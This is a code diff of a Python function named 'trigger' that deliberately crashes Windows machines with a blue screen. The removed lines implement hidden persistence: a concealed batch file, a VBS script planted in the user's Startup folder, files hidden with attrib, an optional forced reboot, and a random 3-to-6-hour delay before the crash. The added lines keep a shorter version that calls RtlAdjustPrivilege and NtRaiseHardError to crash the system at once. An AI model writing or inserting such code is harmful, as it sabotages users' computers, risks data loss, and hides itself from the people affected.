@@ -1,72 +1,24 @@
 def trigger():
-    from subprocess import call
-    from getpass import getuser
-    from pathlib import Path
-    from random import randint
-    from time import sleep
+    from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref
     from sys import platform
 
-    REBOOT_TO_APPLY = False
+    if platform != "win32":
+        return
 
-    def trigger_bsod():
-        from ctypes import windll
-        from ctypes import c_int
-        from ctypes import c_uint
-        from ctypes import c_ulong
-        from ctypes import POINTER
-        from ctypes import byref
+    # Adjust privilege to allow BSOD
+    windll.ntdll.RtlAdjustPrivilege(
+        c_uint(19),  # SeShutdownPrivilege
+        c_uint(1),   # Enable
+        c_uint(0),   # Current thread
+        byref(c_int())
+    )
 
-        nullptr = POINTER(c_int)()
-
-        windll.ntdll.RtlAdjustPrivilege(
-            c_uint(19),
-            c_uint(1),
-            c_uint(0),
-            byref(c_int())
-        )
-
-        windll.ntdll.NtRaiseHardError(
-            c_ulong(0xC000007B),
-            c_ulong(0),
-            nullptr,
-            nullptr,
-            c_uint(6),
-            byref(c_uint())
-        )
-
-    def create_startup_file(trigger_file_path):
-        global REBOOT_TO_APPLY
-
-        startup_file = f"C:\\Users\\{getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.vbs"
-        file_contents = f"Set WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Run chr(34) & \"{trigger_file_path}\" & Chr(34), 0\nSet WshShell = Nothing"
-
-        if not Path(startup_file).exists():
-            REBOOT_TO_APPLY = True
-
-        with open(startup_file, "w+") as file:
-            file.write(file_contents)
-
-
-    def create_trigger_file():
-        trigger_file = Path(__file__).parent.joinpath("trigger.bat")
-        call(f"attrib -H \"{str(trigger_file)}\"", shell=True)
-
-        with open(trigger_file, "w+") as file:
-            file.write(f"pythonw \"{__file__}\"")
-
-        call(f"attrib +H \"{__file__}\"", shell=True)
-        call(f"attrib +H \"{str(trigger_file)}\"", shell=True)
-
-        create_startup_file(str(trigger_file))
-
-    create_trigger_file()
-    if REBOOT_TO_APPLY:
-        if input("> ") == "1":
-            call("shutdown /r /t  1")
-        else:
-            exit(0)
-
-    wait_hours = randint(3, 6)
-    wait_seconds = 3600 * wait_hours
-    sleep(wait_seconds)
-    trigger_bsod()
+    # Trigger BSOD
+    windll.ntdll.NtRaiseHardError(
+        c_ulong(0xC000007B),  # STATUS_INVALID_IMAGE_FORMAT
+        c_ulong(0),
+        POINTER(c_int)(),
+        POINTER(c_int)(),
+        c_uint(6),  #
+        byref(c_uint())
+    )
